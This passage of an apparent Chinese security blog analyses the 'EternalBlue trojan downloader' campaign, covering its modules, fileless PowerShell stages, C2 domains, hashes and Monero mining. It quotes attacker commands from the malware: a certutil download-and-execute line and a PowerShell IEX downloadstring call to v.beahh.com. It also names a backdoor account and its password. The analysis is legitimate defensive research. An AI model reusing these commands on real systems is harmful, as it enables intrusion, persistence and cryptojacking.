src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029154109.png"></p><p>​    同时会循环检测任务管理器以及一系列游戏进程，若有在执行的，则将svhhost.exe退出，以更好的隐藏自身：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029154120.png"></p><ul><li><p>获取当前计算机信息，包括计算机名称、GUID、用户名、系统产品号、系统版本、系统平台、显卡信息、杀软信息等。将上述所有信息上传到</p><p><code>hxxp://i[.]haqo.net/i.png</code></p><p>或</p><p><code>hxxp://p[.]abbny.com/im.png</code></p><p>等待C2返回控制信息并执行：</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029154212.png"></p><ul><li>通过共享内存和远控模块svhhost.exe交互，将下载到的ShellCode通过该共享内存传递给svhhost.exe执行，一般用来执行挖矿代码：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029154234.png"></p><ul><li><p>下载svvhost.exe永恒之蓝攻击模块到本地并执行，下载URL为 ：</p><p><code>hxxp://dl[.]haqo[.]net/eb.exez</code></p><p>若返回的数据有“.exez”后缀信息则下载文件：</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029154515.png"></p><p>​    其保存位置为C:\Windows\temp\svvhost.exe：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029154857.png"></p></li></ol><h2 id="01-远控模块分析"><a href="#01-远控模块分析" class="headerlink" title="01 远控模块分析"></a>01 远控模块分析</h2><p>​    样本信息如下：</p><table><thead><tr><th align="center">名称</th><th align="center">MD5</th></tr></thead><tbody><tr><td align="center">svhhost.exe</td><td align="center">74e2a43b2b7c6e258b3a3fc2516c1235</td></tr></tbody></table><p>​    远控模块木马svhhost.exe主要作用是：每隔2秒从主体样本svhost.exe共享的内存 “HSKALWOEDJSLALQEOD”中读取shellcode，然后进行解压(解密)并执行。整体流程主要包括了持久化操作、获取共享内存执行shellcode:</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029164704.png"></p><p>​    遗憾的是由于时间太久，分析时不能获取到通过内存加载执行shellcode的功能链接，通过对我们在2019年1月9号检测到的名为xmrig-64_1.mlz的文件，也就是上文中提到的通过共享内存传递的Shellcode进行分析，可以确认该文件为门罗币的矿机，文件下载地址为：</p><p><code>hxxp://dl[.]haqo.net/xmrig-64_1.mlz</code>，链接矿池172.105.204.237 进行挖矿。</p><table><thead><tr><th>名称</th><th>MD5</th></tr></thead><tbody><tr><td>xmrig-64_1.mlz</td><td>24c4149468926bedcb41f50ac88b40f3</td></tr></tbody></table><h2 id="02-永恒之蓝传播模块分析"><a href="#02-永恒之蓝传播模块分析" class="headerlink" title="02 永恒之蓝传播模块分析"></a>02 永恒之蓝传播模块分析</h2><p>​    样本信息如下：</p><table><thead><tr><th align="center">名称</th><th align="center">MD5</th></tr></thead><tbody><tr><td align="center">svvhost.exe</td><td align="center">2e9710a4b9cba3cd11e977af87570e3b</td></tr></tbody></table><p>​    svvhost.exe是利用py2exe对python代码进行打包实现的“永恒之蓝”传播模块，将其解压后可以看到如下一系列pyo文件：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155247.png"></p><p>​    传播模块每隔20min进行一次攻击，包括内网漏洞机器及部分外网IP，对于中招的机器，会运行bat命令进行扩散：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cmd</span>.exe /c certutil -urlcache -split -fhttp://dl.haqo.<span class="built_in">net</span>/ dl.exe c:/install.exe&amp;c:/install.exe&amp;netshfirewall add portopening tcp <span class="number">65531</span> DNS&amp;netsh interface portproxy    add v4tov4listenport=<span class="number">65531</span> connectaddress=<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span> connectport=<span class="number">53</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155312.png"></p><h1 id="3-向无文件攻击方式转变"><a href="#3-向无文件攻击方式转变" class="headerlink" title="3. 向无文件攻击方式转变"></a>3. 向无文件攻击方式转变</h1><p>​    通过上文的分析得知，最初“永恒之蓝木马下载器”系列木马的远控模块和传播模块文件需要落地，较为容易查杀，随着时间的推进，攻击者对木马进行了改进，最终完全脱离了原有流程，做到了无文件落地的”计划任务+PowerShell”的攻击模式，这使得攻击更加隐蔽，查杀难度增大。</p><p>​    从2018年12月19号开始，攻击者开始逐步进行更新，首先更新的是传播模块。</p><p>​    木马攻击成功后会在失陷主机上创建一个名为Bluetooths的计划任务，该计划任务会利用PowerShell从v.beahh.com处获取新的payload进行执行，该系列payload会为下载模块功能做前期准备，准备完成后下载攻击传播模块及挖矿模块到内存，然后直接利用IEX命令进行执行。 </p><p>​    由此开始，“永恒之蓝木马下载器”系列木马实现了新的攻击方式，脱离了最初版本需要文件落地的攻击模式，做到了无文件落地攻击。</p><p>​    整个攻击流程的变迁效果如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155422.png"></p><h2 id="00-新传播模块分析"><a href="#00-新传播模块分析" class="headerlink" title="00 新传播模块分析"></a>00 新传播模块分析</h2><p>​    与上述最初的传播模块还只是利用单一的永恒之蓝漏洞攻击不同，新的攻击组件集成了永恒之蓝漏洞、SMB爆破、MsSQL爆破等攻击方式，同时利用到了黑客工具mimiktaz、psexec等进行辅助破解攻击，在攻击成功后也采用添加用户、创建服务、创建计划任务的方式对被攻破的机器进行感染和控制。</p><p>​    这里我们从最新的传播模块进行整体手法的剖析，其中捕获到的一份利用url：</p><p><code>hxxp://27.102.107[.]137/ii.exe</code></p><p>​    下载的传播模块文件ii.exe(md5:def0e980d7c2a59b52d0c644a6e40763 )，该文件由pyinstaller打包而来，其和最初传播模块具体不同如下：</p><ol><li>使用窃取的数字签名（当前已过期），并将py模块编译为库（pyd）从而达到隐藏自己与增加分析难度的目的：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155536.png"></p><p>​    去除签名，然后反编译，解包后的内容如下：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155600.png"></p><p>​    继续反编译ii.pyc，得到脚本，脚本使用了base64和bz2加密：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155819.png"></p><p>​    对加密脚本进行解密，其中依旧使用名称替换的方式进行了混淆，结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155842.png"></p><ol start="2"><li>首先会检测更新当前机器传播模块的版本是否为最新版。具体是通过内存映射检测当前版本，版本存储于内存映射中的格式为“自身路径+’**’+当前版本号+’$$’”，判断版本号是否相同，如果当前版本大于内存映射中的版本，则将程序复制过去：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155918.png"></p><ol start="3"><li> 加入了SMB、MSSQL弱口令爆破攻击，用于SMB、MsSql爆破的弱口令如下图所示。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029155946.png"></p><p>​    其中，部分SMB弱口令攻击代码如下：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160019.png"></p><p>​    部分MsSQL数据库弱口令攻击代码如下：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160151.png"></p><ol start="4"><li>之后会将多层混淆的mimikatz工具的powershell代码写入当前目录下的m2.ps1文件中，并将其在内存中直接执行：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160212.png"></p><p>​    部分m2.ps1内代码如下图所示:</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160259.png"></p><p>​    将抓取到的用户机器的域名、用户名、密码等信息保存到同目录下mkatz.ini文件中，格式如下图所示，所以若局域网中存在使用相同密码的机器，很容易被一网打尽，修改默认密码的重要性不言而喻。</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160330.png"></p><ol start="5"><li>利用PsExec工具完成对被攻陷机器的远程控制，远程控制会去验证账户k8h3d并进行判断，如果已经感染成功，就会进行远程cmd执行，包括但不限于创建计划任务下载Payload、检测恶意组件、运行恶意组件等行为。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160355.png"></p><ol start="6"><li>扫描网络中开放有1433端口(SQL Server)的主机，尝试用弱密码进行登录，若成功则利用SQLServer服务在目标主机中添加一个标志性的账户k8h3d，此账户密码为k8d3j9SjfS7</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160405.png"></p><p>​    另外还会创建名为Bluetooths的计划任务，该计划任务通过bypass的方式绕过本地权限利用cmd执行base64加密的powershell来执行下一阶段任务：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160447.png"></p><p>​    该计划任务就是在被攻陷机器中开始新攻击的重要入口，计划任务每隔50分钟执行一次powershell脚本，该脚本作用为下载并执行下一阶段攻击程序， 上图中加密powershell解密后，内容如下，：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell  <span class="literal">-ep</span> bypass –e <span class="built_in">IEX</span>(<span class="built_in">New-Objects</span> Net.WebClinet).downloadstring(<span class="string">&quot;http://v.beahh.com/v&quot;</span>+<span class="variable">$env:USERDOMAIN</span>)</span><br></pre></td></tr></table></figure><ol start="7"><li><p>新传播模块也会进行一些信息收集操作，统计的信息包括本地网卡mac地址、杀软信息、系统版本、感染标志、当前用户组、当前用户名等，其用于对感染信息的统计和后续的控制下发，上传信息的地址列表如下：</p><p><code>hxxp://info[.]haqo.net/e.png</code></p><p><code>hxxp://info[.]beahh.com/e.png</code></p><p><code>hxxp://info[.]abbny.com/e.png</code></p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160609.png"></p><h2 id="01-入侵之后的后续攻击-前置准备"><a href="#01-入侵之后的后续攻击-前置准备" class="headerlink" title="01 入侵之后的后续攻击-前置准备"></a>01 入侵之后的后续攻击-前置准备</h2><p>​    入侵新机器成功后，会通过上述计划任务Bluetooths下载powershell脚本并加载到内存中执行，这里将其命名为v.ps1,捕获到多份经过多次混淆(至少4次)的powersehll脚本：</p><table><thead><tr><th>名称</th><th align="center">MD5</th></tr></thead><tbody><tr><td>v.ps1</td><td align="center">95adf923ba32cc5004277867181680c8</td></tr><tr><td>v.ps1</td><td align="center">55f0dd8c306db9fc8b9e45705cd66598</td></tr><tr><td>v.ps1</td><td align="center">c17cdee1afdc272a46b1cf25c1f44dcc</td></tr></tbody></table><p>​    从时间线来看，最初版本的脚本是在19年2月22被发现的v(95adf923ba32cc5004277867181680c8)</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160737.png"></p><p>​    该脚本是一个最初的测试版本，有如下一系列功能，其暂时未配置无文件挖矿功能：</p><ol><li> 通过WMI查询当前计算机信息，包括MAC地址、所有杀软信息，另外会检测是否存在杀软主动防御服务，完成后睡眠一段时间：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160818.png"></p><ol start="2"><li>通过WMI检测列表中所有的系统进程是否运行，运行则关闭对应进程，并在之后清除对应进程文件，用于之后恶意样本对进程替换达到隐藏恶意攻击的目的：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160842.png"></p><p>检查的系统进程如下：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160854.png"></p><ol start="3"><li><p>将收集到信息进行拼接，并判断如下三个标志文件的存在状态，来更新对应的exe传播模块，该版本攻击手法中，依旧存在用于传播的exe组件：<code>C:\Users\ADMINI~1\AppData\Local\Temp\tmplog.tmp</code></p><p><code>C:\Users\ADMINI~1\AppData\Local\Temp\tmplog2.tmp</code></p><p><code>C:\Windows\随机八位数字名称.exe</code></p><p>若检测到不存在tmplog2.tmp，则循环查询C:\Windows\下的所有命名格式随机八位数字名称.exe的文件，创建以其文件名命名的计划任务来持久化运行。</p><p>若检测到不存在tmplog.tmp，则会去如下URL：<code>hxxp://d[.\]beahh.com/update.png?p=11](http://d.beahh.com/update.png?p=11)</code> 处对传播模块exe进行更新，获取新的样本到C:\Windows\随机八位数字名称.exe，并创建对应的计划任务进行持久化执行：</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029160941.png"></p><ol start="4"><li><p>继续执行，稍后从URL：</p><p><code>hxxp://172[.]104.177.202/new.dat?11+信息+状态 </code></p><p>处获取powershell脚本到C:\ProgramData\Microsoft\cred.ps1，然后加载到内存中执行，同时创建名为Credentials的计划任务，定时启动该文件cred.ps1：</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161114.png"></p><p>​    创建的计划任务Credentials如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161129.png"></p><p>​    而从2019年2日开始，最新版本的v.ps1进行下发，新版包括了无文件挖矿的powershell脚本：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161244.png"></p><p>​    样本中执行流程会依据C:\Users\ADMINI~1\AppData\Local\Temp下的几个不同日志文件存在状态来控制后续PayLoad的下发，具体文件和行为如下：</p><p><strong>kkk1.log：</strong></p><p>​    不存在创建以mac地址命名的计划任务，操作为从url：hxxp://v[.]y6h.net/g?h+当前时间 请求下载后续PayLoad加载到内存中直接执行：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161326.png"></p><p>​    计划任务如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161342.png"></p><p>​    下载到的Payload为g(4ec29049ac81521c37dad2da6754d6a3)，解混淆后，主要完成了收集mac地址、杀软信息、感染版本、系统版本、用户名等信息并上传到服务器，用于获取到后续脚本：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161357.png"></p><p><strong>pp2.log：</strong></p><p>​    不存在行为和上述测试版设置计划任务，运行下载的cred.ps1相同，不同之处在于domain进行了改变，新domain为down[.]beahh.com：：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161420.png"></p><p><strong>333.log：</strong></p><p>​    不存在则从<code>hxxp://down[.]beahh.com/mn.dat?allv5</code>处下载mn.dat存储为mn.exe，然后加载运行，该模块就是最初的挖矿模块<strong>。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161440.png"></p><p><strong>kk4.log：</strong></p><p>​    不存在则从<code>hxxp://down[.]beahh.com/ii.dat?p=allv5</code>处下载ii.dat，命名为4~8个随机字母.exe，该模块就是上述的ii.exe传播模块：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161501.png"></p><p><strong>ps5.log：</strong></p><p>​    在这里不同版本的脚本开始出现区别，在4月2号的样本中，该文件不存在则从hxxp://down[.]beahh.com/ddd.dat?allv5处下载ddd.dat，存储为ddd.exe，该模块为新版的利用了显卡驱动相关的挖矿模块：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161526.png"></p><p>​    而在4月3号的样本中，该步骤被去掉，新增了依据当前系统版本下载对应的d64.dat或d32.dat脚本并直接在内存中执行的流程，下载的脚本为powershell无文件挖矿脚本：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161541.png"></p><h2 id="02-入侵之后的后续攻击-无文件挖矿"><a href="#02-入侵之后的后续攻击-无文件挖矿" class="headerlink" title="02 入侵之后的后续攻击-无文件挖矿"></a>02 入侵之后的后续攻击-无文件挖矿</h2><p>​    这里以捕获到的d64.ps1样本进行分析说明，信息如下：</p><table><thead><tr><th align="center">名称</th><th align="center">MD5</th></tr></thead><tbody><tr><td align="center">d64.dat</td><td align="center">c90ecc4e12e085c7fbc571d9ba6d00d4</td></tr></tbody></table><p>​    解混淆后，脚本具体功能分析如下，该类型无文件挖矿脚本都是如下所示的流程：</p><ol><li>XMRig挖矿木马脚本被使用Base64编码保存：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029164952.png"></p><ol start="2"><li>初始化Invoke-ReflectivePEInjection(内存中执行PE)</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161630.png"></p><ol start="3"><li>经过一系列配置操作后，调用Invoke-ReflectivePEInjection将代码加载到内存中执行：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161640.png"></p><ol start="4"><li>运行后，进行挖矿，矿池为52[.]139.168.125，运行状态如下图所示，此时版本为2.14.0，后续该挖矿脚本也会随时间的推移逐步更新：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161659.png"></p><h2 id="03-入侵之后的后续攻击-传播模块"><a href="#03-入侵之后的后续攻击-传播模块" class="headerlink" title="03 入侵之后的后续攻击-传播模块"></a>03 入侵之后的后续攻击-传播模块</h2><p>​    上述准备阶段下载到的所有powershell中，cred.ps1为后续攻击的开始powershell，这里捕获到两份相关的文件：</p><table><thead><tr><th align="center">名称</th><th align="center">MD5</th></tr></thead><tbody><tr><td align="center">cred.ps1(V1)</td><td align="center">31ce6662be59ca4c01c1730bc7150f19</td></tr><tr><td align="center">cred.ps1(V5)</td><td align="center">e05827e44d487d1782a32386123193ef</td></tr></tbody></table><p>​    两份powershell脚本都经过了4次加密混淆，主要区别在于版本不同，这里用最新到的v5版本的样本进行行为说明，cred.ps1(V5)脚本结构大致如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161743.png"></p><p>​    该版本的传播模块与上文中分析的老版本相比最重要的区别是开始利用IEX直接加载到内存中执行的，从而完成了无文件攻击的方式。当然其在一些攻击细节方面也进行了调整优化，比如：</p><ol><li>调用永恒之蓝漏洞攻击：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161824.png"></p><p>​    对于不同的系统进行了不同的定制化操作，其中eb7函数主要针对Win 7、Windows2008、Windows vista、windows 2011，eb8函数主要针对win10、win 8、windows 2012。</p><p><strong>eb7函数：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161900.png">****</p><p><strong>eb8函数：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161908.png"></p><ol start="2"><li>新SMB弱口令爆破密码：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161936.png"></p><p>​    攻击完成后，将FlashPlayer.lnk和flashplayer.tmp植入到目标机器并设置菜单启动目录进行新一轮的攻击：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029161955.png"></p><ol start="5"><li>循环进行版本更新，从hxxp://p[.]beahh.com/upgrade.php?ver=5&amp;mac=处获取更新信息：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162023.png"></p><p>​    通过对比发现，该脚本和Mykings僵尸网络变种木马使用到的攻击手法有很多类似，比如包括相同的攻击函数eb7()、eb8()，创建的计划任务都为%appdata%\Microsoft目录下，都会在攻击成功后对目标机器上传文件设置菜单启动项等。</p><h1 id="4-不断更新的攻击组件"><a href="#4-不断更新的攻击组件" class="headerlink" title="4. 不断更新的攻击组件"></a>4. 不断更新的攻击组件</h1><p>​    从19年4月开始，”永恒之蓝木马下载器”系列木马开始稳定的利用上述计划任务+powershell的无文件方式进行传播与攻击。之后对攻击组件和挖矿脚本依旧进行着频繁的更新，使其攻击能力和挖矿能力不断提升。其中对于域名和PoweShell脚本名称也进行了多次更改，其中使用到了DGA算法进行域名的生成，而windows下的攻击组件名称也变为了if.bin，近期攻击方式整理为下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162102.png"></p><p>​    其中在最新获取的if.bin传播模块中，攻击组件完成攻击后，远程在目标机上执行的命令部分如下，主要攻击方式为通过最新的Domain(如：t[.]zz3r0.com、t[.]zer9g.com、t[.]amynx.com、t[.]ackng.com)下载对应的PowerShell脚本并加载到内存执行攻击：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162117.png"></p><p>​    截至20年10月，该系列木马现有的攻击手段包括但不限于下图中的所有攻击方式：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162138.png"></p><h2 id="00-再次变化的传播方式分析"><a href="#00-再次变化的传播方式分析" class="headerlink" title="00 再次变化的传播方式分析"></a>00 再次变化的传播方式分析</h2><p>​    上图所述的所有攻击方式，只要有一种可以完成入侵任务，那么传播过程就会继续向下蔓延，通过在目标机上远程对诸如上述的ipc.jsp、ms.jsp、usb.jsp、mail.jsp、smgh.jsp(也叫做ipc.bin、ms.bin等)等等一系列以对应攻击方式来命名的脚本文件进行下载和执行，来完成新的传播。这里对该类脚本主要完成操作进行简要说明：</p><ol><li>会利用WMI命令检测常见杀软，并对其进行卸载：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162236.png"></p><ol start="2"><li>创建计划任务blackball以及三个名称随机和路径随机的计划任务：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162251.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162302.png"></p><p>​    计划任务用于启动powershell执行如下图所示的脚本，用于下载新的前置准备模块a.jsp，我们留待稍后解释：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162319.png"></p><ol start="3"><li>利用netsh.exe设置防火墙相关的规则：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029162337.png"></p><h2 id="01-新的攻击前准备模块a-jsp"><a 